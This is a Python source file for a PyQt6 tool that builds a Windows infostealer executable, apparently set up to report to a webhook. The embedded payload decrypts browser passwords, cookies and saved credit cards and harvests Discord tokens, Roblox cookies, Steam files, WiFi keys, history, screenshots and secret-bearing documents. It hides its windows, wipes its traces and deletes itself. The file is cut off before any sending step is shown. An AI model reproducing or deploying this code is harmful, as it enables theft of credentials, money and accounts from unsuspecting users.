from __future__ import annotations

import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import textwrap
import threading
from pathlib import Path

import requests
def _configure_qt_plugins() -> None:
    os.environ.setdefault("QT_QPA_PLATFORM", "windows")
    if os.environ.get("QT_QPA_PLATFORM_PLUGIN_PATH"):
        return
    for mod in ("PyQt6", "PySide6"):
        try:
            spec = importlib.util.find_spec(mod)
            if not spec or not spec.origin:
                continue
            platforms = Path(spec.origin).resolve().parent / "Qt6" / "plugins" / "platforms"
            if platforms.is_dir():
                os.environ["QT_QPA_PLATFORM_PLUGIN_PATH"] = str(platforms)
                plugins = platforms.parent
                if plugins.is_dir():
                    os.environ.setdefault("QT_PLUGIN_PATH", str(plugins))
                return
        except Exception:
            pass


_configure_qt_plugins()

from PyQt6.QtWidgets import (
    QApplication, QGridLayout, QHBoxLayout, QLabel, QLineEdit, QListWidget,
    QMainWindow, QMessageBox, QProgressBar, QPushButton, QScrollArea,
    QStackedWidget, QTextEdit, QVBoxLayout, QWidget,
)
from PyQt6.QtCore import QEasingCurve, QPropertyAnimation, QThread, Qt, pyqtProperty, pyqtSignal
from PyQt6.QtGui import QBrush, QColor, QPainter

APP_DIR = Path(__file__).resolve().parent
BUILD_DIR = APP_DIR / ".build"
CLIENT_SRC = BUILD_DIR / "client_build.py"
OUTPUT_EXE = APP_DIR / "client.exe"

PYTHON_EXE = sys.executable
if PYTHON_EXE.lower().endswith("pythonw.exe"):
    PYTHON_EXE = PYTHON_EXE[:-11] + "python.exe"

def _escape_webhook(s: str) -> str:
    return json.dumps(s)

def _fn_stealth_utils() -> str:
    return textwrap.dedent(
        """
        import atexit
        import os
        import random
        import string
        import subprocess
        import sys
        import time

        _NO_WINDOW = 0x08000000
        _TEMP_FILES = []

        def _rand_name(n=14):
            return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

        def secure_wipe(path):
            try:
                if os.path.isfile(path):
                    size = os.path.getsize(path)
                    with open(path, "r+b") as fh:
                        fh.write(os.urandom(max(1, min(size, 131072))))
                        fh.flush()
                    os.remove(path)
            except Exception:
                try:
                    os.remove(path)
                except Exception:
                    pass

        def temp_copy(src, retries=3):
            dst = os.path.join(os.environ.get("TEMP", "."), _rand_name(18) + ".db")
            for i in range(retries):
                try:
                    with open(src, "rb") as fin, open(dst, "wb") as fout:
                        while True:
                            chunk = fin.read(1024 * 1024)
                            if not chunk:
                                break
                            fout.write(chunk)
                    for suffix in ("-wal", "-shm"):
                        side = src + suffix
                        if os.path.isfile(side):
                            try:
                                with open(side, "rb") as fin, open(dst + suffix, "wb") as fout:
                                    while True:
                                        chunk = fin.read(1024 * 1024)
                                        if not chunk:
                                            break
                                        fout.write(chunk)
                            except Exception:
                                pass
                    _TEMP_FILES.append(dst)
                    for suffix in ("-wal", "-shm"):
                        p = dst + suffix
                        if os.path.isfile(p):
                            _TEMP_FILES.append(p)
                    return dst
                except Exception:
                    time.sleep(0.2)
            return None

        def _profile_dir(path):
            if not os.path.isdir(path):
                return False
            markers = ("Preferences", "Login Data", "Cookies", "Web Data", "History")
            return any(os.path.isfile(os.path.join(path, m)) for m in markers)

        def chromium_profiles(root, db_name):
            found = []
            if not os.path.isdir(root):
                return found
            skip = {
                "GrShaderCache", "ShaderCache", "BrowserMetrics", "Crashpad",
                "GraphiteDawnCache", "Safe Browsing", "segmentation_platform",
                "WidevineCdm", "component_crx_cache", "extensions_crx_cache",
                "Guest Profile", "System Profile",
            }
            try:
                for name in os.listdir(root):
                    if name in skip or name.startswith("."):
                        continue
                    prof = os.path.join(root, name)
                    if not _profile_dir(prof):
                        continue
                    db_path = os.path.join(prof, db_name)
                    if os.path.isfile(db_path):
                        found.append((name, db_path))
            except OSError:
                pass
            return found

        def cleanup_traces():
            for path in list(_TEMP_FILES):
                secure_wipe(path)
            _TEMP_FILES.clear()

        def run_hidden(args, timeout=20):
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            
            class DummyProcess:
                def __init__(self, out):
                    self.stdout = out

            try:
                proc = subprocess.Popen(
                    args,
                    shell=isinstance(args, str),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    startupinfo=si,
                    creationflags=_NO_WINDOW,
                )
                try:
                    out, _ = proc.communicate(timeout=timeout)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    out = b""
                return DummyProcess(out)
            except Exception:
                return DummyProcess(b"")

        def iter_user_dirs():
            seen = set()
            drive = os.environ.get("SystemDrive", "C:")
            users = os.path.join(drive + os.sep, "Users")
            skip = {"Public", "Default", "Default User", "All Users"}
            if os.path.isdir(users):
                for name in os.listdir(users):
                    if name in skip:
                        continue
                    base = os.path.join(users, name)
                    if not os.path.isdir(base):
                        continue
                    local = os.path.join(base, "AppData", "Local")
                    roam = os.path.join(base, "AppData", "Roaming")
                    key = (local, roam)
                    if key not in seen:
                        seen.add(key)
                        yield name, local, roam
            local = os.environ.get("LOCALAPPDATA", "")
            roam = os.environ.get("APPDATA", "")
            user = os.environ.get("USERNAME", "user")
            key = (local, roam)
            if key not in seen:
                yield user, local, roam

        def chromium_roots():
            specs = [
                ("Chrome", lambda l, r: os.path.join(l, "Google", "Chrome", "User Data")),
                ("Edge", lambda l, r: os.path.join(l, "Microsoft", "Edge", "User Data")),
                ("Brave", lambda l, r: os.path.join(l, "BraveSoftware", "Brave-Browser", "User Data")),
                ("Vivaldi", lambda l, r: os.path.join(l, "Vivaldi", "User Data")),
                ("Chromium", lambda l, r: os.path.join(l, "Chromium", "User Data")),
                ("Yandex", lambda l, r: os.path.join(l, "Yandex", "YandexBrowser", "User Data")),
                ("Arc", lambda l, r: os.path.join(l, "Arc", "User Data")),
                ("Opera", lambda l, r: os.path.join(r, "Opera Software", "Opera Stable")),
                ("OperaGX", lambda l, r: os.path.join(r, "Opera Software", "Opera GX Stable")),
            ]
            out, seen = [], set()
            for user, local, roam in iter_user_dirs():
                for name, fn in specs:
                    path = fn(local, roam)
                    if path in seen or not os.path.isdir(path):
                        continue
                    seen.add(path)
                    out.append((f"{name}/{user}", path))
            return out

        def safe_read(path, max_bytes=5242880):
            try:
                try:
                    with open(path, "rb") as fh:
                        return fh.read(max_bytes).decode("utf-8", errors="ignore")
                except PermissionError:
                    tmp = temp_copy(path)
                    if tmp:
                        try:
                            with open(tmp, "rb") as fh:
                                return fh.read(max_bytes).decode("utf-8", errors="ignore")
                        finally:
                            secure_wipe(tmp)
                            if tmp in _TEMP_FILES:
                                _TEMP_FILES.remove(tmp)
            except Exception:
                pass
            return ""

        def safe_read_bytes(path, max_bytes=5242880):
            try:
                try:
                    with open(path, "rb") as fh:
                        return fh.read(max_bytes)
                except PermissionError:
                    tmp = temp_copy(path)
                    if tmp:
                        try:
                            with open(tmp, "rb") as fh:
                                return fh.read(max_bytes)
                        finally:
                            secure_wipe(tmp)
                            if tmp in _TEMP_FILES:
                                _TEMP_FILES.remove(tmp)
            except Exception:
                pass
            return b""

        def read_sqlite_rows(src_path, query, params=()):
            import sqlite3
            tmp = temp_copy(src_path)
            if not tmp:
                return []
            copied = [tmp]
            for suffix in ("-wal", "-shm"):
                side = tmp + suffix
                if os.path.isfile(side):
                    copied.append(side)
            rows = []
            try:
                con = sqlite3.connect(tmp)
                cur = con.cursor()
                rows = list(cur.execute(query, params))
                con.close()
            except Exception:
                pass
            finally:
                for path in copied:
                    secure_wipe(path)
                    if path in _TEMP_FILES:
                        _TEMP_FILES.remove(path)
            return rows

        def self_delete():
            try:
                exe = os.path.abspath(sys.argv[0])
                if not exe.lower().endswith(".exe"):
                    return
                bat = os.path.join(os.environ.get("TEMP", "."), _rand_name(10) + ".cmd")
                lines = [
                    "@echo off",
                    "ping 127.0.0.1 -n 2 >nul",
                    f'del /f /q "{exe}"',
                    'del /f /q "%~f0"',
                ]
                nl = chr(13) + chr(10)
                with open(bat, "w", encoding="utf-8", newline="") as fh:
                    fh.write(nl.join(lines))
                subprocess.Popen(
                    ["cmd", "/c", bat],
                    creationflags=_NO_WINDOW,
                    close_fds=True,
                )
            except Exception:
                pass

        atexit.register(cleanup_traces)
        """
    ).strip()


def _fn_system_info() -> str:
    return textwrap.dedent(
        """
        def grab_system_info():
            import ctypes
            import getpass
            import os
            import platform
            import socket

            lines = []

            def add(label, val):
                if val not in (None, "", []):
                    lines.append(f"{label}: {val}")

            add("User", getpass.getuser())
            add("Host", socket.gethostname())
            add("OS", f"{platform.system()} {platform.release()} build {platform.version()}")
            add("Arch", platform.machine())
            add("Cores", os.cpu_count())
            try:
                add("Admin", bool(ctypes.windll.shell32.IsUserAnAdmin()))
            except Exception:
                pass

            try:
                r = run_hidden(["wmic", "computersystem", "get", "manufacturer,model", "/format:list"], timeout=5)
                for line in r.stdout.decode(errors="ignore").splitlines():
                    if "=" in line:
                        k, v = line.split("=", 1)
                        if v.strip():
                            add(k.strip(), v.strip())
            except Exception:
                pass

            try:
                r = run_hidden(["wmic", "memorychip", "get", "capacity"], timeout=5)
                cap = sum(int(x) for x in r.stdout.decode(errors="ignore").split() if x.isdigit())
                if cap:
                    add("RAM GB", round(cap / (1024 ** 3), 1))
            except Exception:
                pass

            try:
                r = run_hidden(["wmic", "path", "win32_VideoController", "get", "name"], timeout=5)
                gpus = [x.strip() for x in r.stdout.decode(errors="ignore").splitlines() if x.strip() and x.strip().lower() != "name"]
                if gpus:
                    add("GPU", ", ".join(gpus[:3]))
            except Exception:
                pass

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                add("LAN", s.getsockname()[0])
                s.close()
            except Exception:
                pass

            try:
                import requests
                add("WAN", requests.get("https://api.ipify.org", timeout=6).text.strip())
            except Exception:
                pass

            try:
                tz = run_hidden(["tzutil", "/g"], timeout=4).stdout.decode(errors="ignore").strip()
                add("TZ", tz)
            except Exception:
                pass

            return "\\n".join(lines) if lines else "system info unavailable"
        """
    ).strip()


def _fn_screenshot() -> str:
    return textwrap.dedent(
        """
        def grab_screenshot():
            import io
            from PIL import ImageGrab
            try:
                img = ImageGrab.grab(all_screens=True)
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=75)
                buf.seek(0)
                return buf
            except Exception:
                return None
        """
    ).strip()


def _fn_grab_history() -> str:
    return textwrap.dedent(
        """
        def grab_browser_history(limit=200):
            import os
            from datetime import datetime, timezone

            rows = []
            seen = set()

            q = (
                "SELECT url, title, last_visit_time FROM urls "
                "WHERE url NOT LIKE 'chrome://%' AND url NOT LIKE 'edge://%' "
                "ORDER BY last_visit_time DESC LIMIT ?"
            )

            def chrome_ts(ts):
                try:
                    epoch = datetime(1601, 1, 1, tzinfo=timezone.utc).timestamp()
                    return datetime.fromtimestamp(epoch + (ts / 1_000_000)).strftime("%Y-%m-%d %H:%M")
                except Exception:
                    return "unknown"

            for label, root in chromium_roots():
                for prof, path in chromium_profiles(root, "History"):
                    for url, title, ts in read_sqlite_rows(path, q, (limit,)):
                        url = (url or "").strip()
                        if not url or url in seen:
                            continue
                        seen.add(url)
                        title = (title or "").strip() or "(no title)"
                        rows.append(f"[{label}/{prof}] {chrome_ts(ts)} | {title}\\n  {url}")

            ff_roots = []
            for user, _local, roam in iter_user_dirs():
                p = os.path.join(roam, "Mozilla", "Firefox", "Profiles")
                if os.path.isdir(p):
                    ff_roots.append((user, p))
            fq = (
                "SELECT p.url, p.title, MAX(h.visit_date) FROM moz_places p "
                "JOIN moz_historyvisits h ON h.place_id = p.id "
                "WHERE p.url NOT LIKE 'place:%' "
                "GROUP BY p.url ORDER BY MAX(h.visit_date) DESC LIMIT ?"
            )
            for user, ff_root in ff_roots:
                for prof in os.listdir(ff_root):
                    places = os.path.join(ff_root, prof, "places.sqlite")
                    for url, title, ts in read_sqlite_rows(places, fq, (limit,)):
                        url = (url or "").strip()
                        if not url or url in seen:
                            continue
                        seen.add(url)
                        try:
                            when = datetime.fromtimestamp((ts or 0) / 1_000_000).strftime("%Y-%m-%d %H:%M")
                        except Exception:
                            when = "unknown"
                        title = (title or "").strip() or "(no title)"
                        rows.append(f"[Firefox/{user}/{prof}] {when} | {title}\\n  {url}")

            if not rows:
                return "No browser history found."
            return "\\n".join(rows[:limit])
        """
    ).strip()


def _fn_grab_wifi() -> str:
    return textwrap.dedent(
        """
        def grab_wifi_passwords():
            import re
            rows = []
            seen = set()
            try:
                listing = run_hidden(["netsh", "wlan", "show", "profiles"], timeout=12)
                text = listing.stdout.decode("utf-8", errors="ignore")
                
                names = []
                for line in text.splitlines():
                    if ":" in line:
                        val = line.split(":", 1)[1].strip()
                        if val:
                            names.append(val)
                
                for name in names:
                    if name in seen:
                        continue
                    seen.add(name)
                    detail = ""
                    for args in (
                        ["netsh", "wlan", "show", "profile", name, "key=clear"],
                        ["netsh", "wlan", "show", "profile", f'name="{name}"', "key=clear"],
                    ):
                        try:
                            res = run_hidden(args, timeout=12)
                            detail = res.stdout.decode("utf-8", errors="ignore")
                            if "Key Content" in detail or "Contenido" in detail or "inhalt" in detail.lower() or "contenu" in detail.lower():
                                break
                        except Exception:
                            continue
                            
                    pwd = "(none)"
                    auth = "?"
                    for line in detail.splitlines():
                        if ":" in line:
                            k, v = line.split(":", 1)
                            k_low = k.lower()
                            if "key content" in k_low or "contenido" in k_low or "inhalt" in k_low or "contenu" in k_low or "chave" in k_low:
                                pwd = v.strip()
                            elif "authentication" in k_low or "autenticación" in k_low or "authentifizierung" in k_low or "authentification" in k_low:
                                auth = v.strip()
                                
                    rows.append(f"SSID: {name}\\nAuth: {auth}\\nKey: {pwd}")
            except Exception:
                pass
            return "\\n".join(rows) if rows else "No saved WiFi profiles found."
        """
    ).strip()


def _fn_chromium_core() -> str:
    return textwrap.dedent(
        """
        def chromium_master_key(root):
            import base64
            import json
            import os
            from ctypes import Structure, byref, c_byte, windll, wintypes, POINTER

            class DATA_BLOB(Structure):
                _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_byte))]

            def dpapi_decrypt(data):
                if not data:
                    return b""
                blob_in = DATA_BLOB(len(data), (c_byte * len(data)).from_buffer_copy(data))
                blob_out = DATA_BLOB()
                if windll.crypt32.CryptUnprotectData(
                    byref(blob_in), None, None, None, None, 0, byref(blob_out)
                ):
                    out = bytes(blob_out.pbData[i] for i in range(blob_out.cbData))
                    windll.kernel32.LocalFree(blob_out.pbData)
                    return out
                return b""

            state_path = os.path.join(root, "Local State")
            text = safe_read(state_path)
            if not text:
                return None
            try:
                state = json.loads(text)
                enc_key = state.get("os_crypt", {}).get("encrypted_key")
                if not enc_key:
                    return None
                raw = base64.b64decode(enc_key)
                if raw.startswith(b"DPAPI"):
                    raw = raw[5:]
                return dpapi_decrypt(raw)
            except Exception:
                return None

        def chromium_decrypt(data, key):
            if not data:
                return ""
            if isinstance(data, str):
                data = data.encode("latin-1", errors="ignore")
            if not isinstance(data, (bytes, bytearray)):
                return ""
            try:
                prefix = data[:3]
                if prefix in (b"v10", b"v11", b"v20"):
                    if not key:
                        return ""
                    from Cryptodome.Cipher import AES
                    iv = data[3:15]
                    payload = data[15:]
                    if len(payload) < 17:
                        return ""
                    ct, tag = payload[:-16], payload[-16:]
                    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                    try:
                        plain = cipher.decrypt_and_verify(ct, tag)
                    except Exception:
                        return ""
                    return plain.decode("utf-8", errors="ignore")
                from ctypes import Structure, byref, c_byte, windll, wintypes, POINTER
                class DATA_BLOB(Structure):
                    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_byte))]
                blob_in = DATA_BLOB(len(data), (c_byte * len(data)).from_buffer_copy(data))
                blob_out = DATA_BLOB()
                if windll.crypt32.CryptUnprotectData(
                    byref(blob_in), None, None, None, None, 0, byref(blob_out)
                ):
                    out = bytes(blob_out.pbData[i] for i in range(blob_out.cbData))
                    windll.kernel32.LocalFree(blob_out.pbData)
                    return out.decode("utf-8", errors="ignore")
            except Exception:
                pass
            return ""
        """
    ).strip()


def _fn_grab_passwords() -> str:
    return textwrap.dedent(
        """
        def grab_browser_passwords():
            import os
            rows = []
            seen = set()
            for label, root in chromium_roots():
                if not os.path.isdir(root):
                    continue
                key = chromium_master_key(root)
                for prof, login_db in chromium_profiles(root, "Login Data"):
                    for url, user, pwd in read_sqlite_rows(
                        login_db,
                        "SELECT origin_url, username_value, password_value FROM logins "
                        "WHERE username_value != '' OR password_value != ''",
                    ):
                        url = (url or "").strip()
                        user = (user or "").strip()
                        plain = chromium_decrypt(pwd, key) if pwd else ""
                        if not plain or not url:
                            continue
                        sig = (url, user, plain)
                        if sig in seen:
                            continue
                        seen.add(sig)
                        rows.append(
                            f"[{label}/{prof}] {url}\\n  User: {user or '(none)'}\\n  Pass: {plain}"
                        )
            return "\\n".join(rows) if rows else "No browser passwords found."
        """
    ).strip()


def _fn_grab_cookies() -> str:
    return textwrap.dedent(
        """
        def grab_browser_cookies(limit=300):
            rows = []
            seen = set()
            q = (
                "SELECT host_key, name, encrypted_value, path, expires_utc "
                "FROM cookies ORDER BY last_access_utc DESC LIMIT ?"
            )
            for label, root in chromium_roots():
                key = chromium_master_key(root)
                for prof, db in chromium_profiles(root, "Cookies"):
                    for host, name, enc, path, exp in read_sqlite_rows(db, q, (limit,)):
                        host = (host or "").strip()
                        name = (name or "").strip()
                        if not host or not name:
                            continue
                        plain = chromium_decrypt(enc, key) if enc else ""
                        sig = (host, name, plain)
                        if sig in seen:
                            continue
                        seen.add(sig)
                        rows.append(f"[{label}/{prof}] {host}{path or '/'} | {name}={plain or '-'} | exp={exp}")
            return "\\n".join(rows[:limit]) if rows else "No cookies found."
        """
    ).strip()


def _fn_grab_credit_cards() -> str:
    return textwrap.dedent(
        """
        def grab_credit_cards():
            rows = []
            seen = set()
            q = (
                "SELECT name_on_card, expiration_month, expiration_year, "
                "card_number_encrypted FROM credit_cards"
            )
            for label, root in chromium_roots():
                key = chromium_master_key(root)
                for prof, db in chromium_profiles(root, "Web Data"):
                    for name, em, ey, num in read_sqlite_rows(db, q):
                        card = chromium_decrypt(num, key) if num else ""
                        if not card:
                            continue
                        sig = (name, card, em, ey)
                        if sig in seen:
                            continue
                        seen.add(sig)
                        rows.append(
                            f"[{label}/{prof}] {name or 'Unknown'}\\n"
                            f"  {card}  exp {em or '?'}/{ey or '?'}"
                        )
            return "\\n".join(rows) if rows else "No saved cards found."
        """
    ).strip()


def _fn_grab_discord() -> str:
    return textwrap.dedent(
        """
        def grab_discord_tokens():
            import base64
            import json
            import os
            import re
            from ctypes import Structure, byref, c_byte, windll, wintypes, POINTER

            found = set()
            PLAIN = re.compile(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}")
            MFA = re.compile(r"mfa\\.[\\w-]{80,}")
            ENC = re.compile(r"dQw4w9WgXcQ([^\\"\\\\]+)")

            class DATA_BLOB(Structure):
                _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_byte))]

            def dpapi(data):
                if not data:
                    return b""
                blob_in = DATA_BLOB(len(data), (c_byte * len(data)).from_buffer_copy(data))
                blob_out = DATA_BLOB()
                if windll.crypt32.CryptUnprotectData(
                    byref(blob_in), None, None, None, None, 0, byref(blob_out)
                ):
                    out = bytes(blob_out.pbData[i] for i in range(blob_out.cbData))
                    windll.kernel32.LocalFree(blob_out.pbData)
                    return out
                return b""

            def load_key(base):
                state = os.path.join(base, "Local State")
                text = safe_read(state)
                if not text:
                    return None
                try:
                    blob = json.loads(text).get("os_crypt", {}).get("encrypted_key")
                    if not blob:
                        return None
                    raw = base64.b64decode(blob)
                    if raw.startswith(b"DPAPI"):
                        raw = raw[5:]
                    return dpapi(raw)
                except Exception:
                    return None

            def aes_decrypt(buff, key):
                from Cryptodome.Cipher import AES
                if not buff or not key or len(buff) < 16:
                    return ""
                iv = buff[3:15]
                payload = buff[15:]
                if len(payload) < 17:
                    return ""
                ct, tag = payload[:-16], payload[-16:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                try:
                    return cipher.decrypt_and_verify(ct, tag).decode("utf-8", errors="ignore")
                except Exception:
                    return ""

            def add_token(tok):
                tok = (tok or "").strip().strip('"').strip("'")
                if len(tok) < 50 or tok.count(".") < 2:
                    return
                if PLAIN.fullmatch(tok) or MFA.fullmatch(tok):
                    found.add(tok)

            def scan_text(text, key=None):
                if not text:
                    return
                for tok in MFA.findall(text):
                    add_token(tok)
                for tok in PLAIN.findall(text):
                    add_token(tok)
                if not key:
                    return
                for enc in ENC.findall(text):
                    try:
                        raw = base64.b64decode(enc)
                        add_token(aes_decrypt(raw, key))
                    except Exception:
                        pass

            def scan_leveldb(folder, key=None):
                if not os.path.isdir(folder):
                    return
                try:
                    names = sorted(os.listdir(folder))
                except OSError:
                    return
                for fname in names:
                    if not fname.endswith((".log", ".ldb", ".txt", ".sst")):
                        continue
                    scan_text(safe_read(os.path.join(folder, fname), 786432), key)

            for app in ("discord", "discordcanary", "discordptb", "Lightcord"):
                for user, local, roam in iter_user_dirs():
                    for base in (os.path.join(roam, app), os.path.join(local, app)):
                        if not os.path.isdir(base):
                            continue
                        key = load_key(base)
                        scan_leveldb(os.path.join(base, "Local Storage", "leveldb"), key)
                        scan_text(safe_read(os.path.join(base, "Local State"), 262144), key)

            for label, root in chromium_roots():
                for prof, _ in chromium_profiles(root, "Preferences"):
                    scan_leveldb(os.path.join(root, prof, "Local Storage", "leveldb"))

            if not found:
                return "No Discord tokens found."
            return "\\n".join(sorted(found))
        """
    ).strip()


def _fn_grab_network() -> str:
    return textwrap.dedent(
        """
        def grab_network_info():
            parts = []
            for cmd in (
                ["ipconfig", "/all"],
                ["netsh", "wlan", "show", "interfaces"],
            ):
                try:
                    r = run_hidden(cmd, timeout=15)
                    parts.append(r.stdout.decode("utf-8", errors="ignore"))
                except Exception:
                    pass
            text = "\\n".join(p for p in parts if p.strip())
            return text[:12000] if text.strip() else "No network data."
        """
    ).strip()


def _fn_grab_startup() -> str:
    return textwrap.dedent(
        """
        def grab_startup_items():
            import os
            import winreg

            rows = []

            def read_run(hive, subkey, tag):
                try:
                    key = winreg.OpenKey(hive, subkey)
                except OSError:
                    return
                i = 0
                while True:
                    try:
                        name, val, _ = winreg.EnumValue(key, i)
                        rows.append(f"[{tag}] {name} = {val}")
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)

            read_run(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HKCU")
            read_run(winreg.HKEY_LOCAL_MACHINE, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", "HKLM")

            for user, _local, roam in iter_user_dirs():
                folder = os.path.join(
                    roam, "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
                )
                if os.path.isdir(folder):
                    for fname in os.listdir(folder):
                        rows.append(f"[Startup/{user}] {fname}")

            return "\\n".join(rows) if rows else "No startup items found."
        """
    ).strip()


def _fn_grab_bookmarks() -> str:
    return textwrap.dedent(
        """
        def grab_bookmarks():
            import json

            rows = []
            seen = set()

            def walk(node, label):
                if not isinstance(node, dict):
                    return
                if node.get("type") == "url":
                    url = (node.get("url") or "").strip()
                    name = (node.get("name") or "").strip() or "(no title)"
                    if url and url not in seen:
                        seen.add(url)
                        rows.append(f"[{label}] {name}\\n  {url}")
                for child in node.get("children") or []:
                    walk(child, label)

            for label, root in chromium_roots():
                for prof, bpath in chromium_profiles(root, "Bookmarks"):
                    try:
                        data = json.loads(safe_read(bpath, 512 * 1024) or "{}")
                    except Exception:
                        continue
                    for key, subtree in (data.get("roots") or {}).items():
                        walk(subtree, f"{label}/{prof}/{key}")
            return "\\n".join(rows[:400]) if rows else "No bookmarks found."
        """
    ).strip()


def _fn_grab_autofill() -> str:
    return textwrap.dedent(
        """
        def grab_autofill():
            rows = []
            seen = set()
            q = "SELECT name, value FROM autofill WHERE name != '' ORDER BY count DESC LIMIT 300"
            for label, root in chromium_roots():
                for prof, db in chromium_profiles(root, "Web Data"):
                    for name, val in read_sqlite_rows(db, q):
                        name = (name or "").strip()
                        val = (val or "").strip()
                        if not name:
                            continue
                        sig = (name, val)
                        if sig in seen:
                            continue
                        seen.add(sig)
                        rows.append(f"[{label}/{prof}] {name} = {val}")
            return "\\n".join(rows) if rows else "No autofill found."
        """
    ).strip()


def _fn_grab_steam() -> str:
    return textwrap.dedent(
        """
        def grab_steam_data():
            import os
            parts = []
            for user, _local, roam in iter_user_dirs():
                steam = os.path.join(roam, "Steam")
                if not os.path.isdir(steam):
                    continue
                for fname in ("loginusers.vdf", "config.vdf"):
                    path = os.path.join(steam, "config", fname)
                    if os.path.isfile(path):
                        parts.append(f"[{user}] {fname}\\n{safe_read(path, 65536)}")
            try:
                pf = os.environ.get("ProgramFiles(x86)", "C:\\\\Program Files (x86)")
                steam_pf = os.path.join(pf, "Steam")
                if os.path.isdir(steam_pf):
                    for fname in ("loginusers.vdf", "config.vdf"):
                        path = os.path.join(steam_pf, "config", fname)
                        if os.path.isfile(path):
                            parts.append(f"[System] {fname}\\n{safe_read(path, 65536)}")
            except Exception:
                pass
            return "\\n\\n".join(parts) if parts else "No Steam data found."
        """
    ).strip()


def _fn_grab_roblox() -> str:
    return textwrap.dedent(
        """
        def grab_roblox_cookies():
            rows = []
            seen = set()
            q = (
                "SELECT host_key, name, encrypted_value FROM cookies "
                "WHERE host_key LIKE '%roblox%' OR name LIKE '%ROBLOSECURITY%'"
            )
            for label, root in chromium_roots():
                key = chromium_master_key(root)
                for prof, db in chromium_profiles(root, "Cookies"):
                    for host, name, enc in read_sqlite_rows(db, q):
                        plain = chromium_decrypt(enc, key) if enc else ""
                        if not plain:
                            continue
                        sig = (host, name, plain)
                        if sig in seen:
                            continue
                        seen.add(sig)
                        rows.append(f"[{label}/{prof}] {host} | {name}={plain}")
            return "\\n".join(rows) if rows else "No Roblox cookies found."
        """
    ).strip()


def _fn_grab_processes() -> str:
    return textwrap.dedent(
        """
        def grab_processes():
            try:
                raw = run_hidden(["tasklist", "/FO", "LIST"], timeout=15)
                return raw.stdout.decode(errors="ignore")[:12000]
            except Exception:
                return "No process list available."
        """
    ).strip()


def _fn_grab_apps() -> str:
    return textwrap.dedent(
        """
        def grab_installed_apps():
            import winreg

            rows = []
            seen = set()

            def read_key(hive, subkey):
                try:
                    key = winreg.OpenKey(hive, subkey)
                except Exception:
                    return
                i = 0
                while i < 500:
                    try:
                        sub = winreg.EnumKey(key, i)
                        sk = winreg.OpenKey(key, sub)
                        try:
                            name, _ = winreg.QueryValueEx(sk, "DisplayName")
                            if not name or name in seen:
                                winreg.CloseKey(sk)
                                i += 1
                                continue
                            seen.add(name)
                            try:
                                ver, _ = winreg.QueryValueEx(sk, "DisplayVersion")
                            except Exception:
                                ver = "?"
                            try:
                                pub, _ = winreg.QueryValueEx(sk, "Publisher")
                            except Exception:
                                pub = ""
                            line = f"{name} ({ver})"
                            if pub:
                                line += f" - {pub}"
                            rows.append(line)
                        except Exception:
                            pass
                        winreg.CloseKey(sk)
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)

            for hive, sub in (
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
            ):
                read_key(hive, sub)

            rows.sort(key=str.lower)
            return "\\n".join(rows[:500]) if rows else "No installed apps found."
        """
    ).strip()


def _fn_grab_files() -> str:
    return textwrap.dedent(
        """
        def grab_interesting_files():
            import io
            import os
            import zipfile

            exts = {
                ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx",
                ".kdbx", ".pem", ".key", ".wallet", ".json", ".sql", ".env", ".cfg", ".ini",
                ".rdp", ".ovpn", ".ppk", ".log", ".seed", ".mnemonic", ".bak",
            }
            roots = []
            for user, local, roam in iter_user_dirs():
                home = os.path.dirname(os.path.dirname(local))
                if not os.path.isdir(home):
                    continue
                for sub in ("Desktop", "Documents", "Downloads", "Pictures", "Videos", "OneDrive"):
                    p = os.path.join(home, sub)
                    if os.path.isdir(p):
                        roots.append(p)
                recent = os.path.join(roam, "Microsoft", "Windows", "Recent")
                if os.path.isdir(recent):
                    roots.append(recent)

            keywords = ("password", "secret", "wallet", "seed", "backup", "key", "login", "cred")
            listing = []
            candidates = []
            for root in roots:
                for dirpath, dirnames, files in os.walk(root):
                    dirnames[:] = [d for d in dirnames if d.lower() not in (
                        "node_modules", ".git", "__pycache__", "cache", "temp", "tmp",
                    )]
                    depth = dirpath[len(root):].count(os.sep) if root else dirpath.count(os.sep)
                    if depth > 4:
                        dirnames.clear()
                        continue
                    for fname in files:
                        ext = os.path.splitext(fname)[1].lower()
                        low = fname.lower()
                        if ext not in exts and not any(k in low for k in keywords):
                            continue
                        fpath = os.path.join(dirpath, fname)
                        try:
                            candidates.append((os.path.getmtime(fpath), fpath, fname))
                        except Exception:
                            pass
            candidates.sort(reverse=True)
            buf = io.BytesIO()
            count = 0
            max_files = 15
            max_each = 512 * 1024
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                for _, fpath, fname in candidates:
                    if count >= max_files:
                        break
                    try:
                        size = os.path.getsize(fpath)
                        if size > max_each:
                            listing.append(f"{fpath} (skipped, {size} bytes)")
                            continue
                        data = safe_read_bytes(fpath, max_each)
                        if data:
                            zf.writestr(f"{count}_{fname}", data)
                            listing.append(fpath)
                            count += 1
                    except Exception:
                        pass
            if count == 0:
                return None, "No matching files found."
            buf.seek(0)
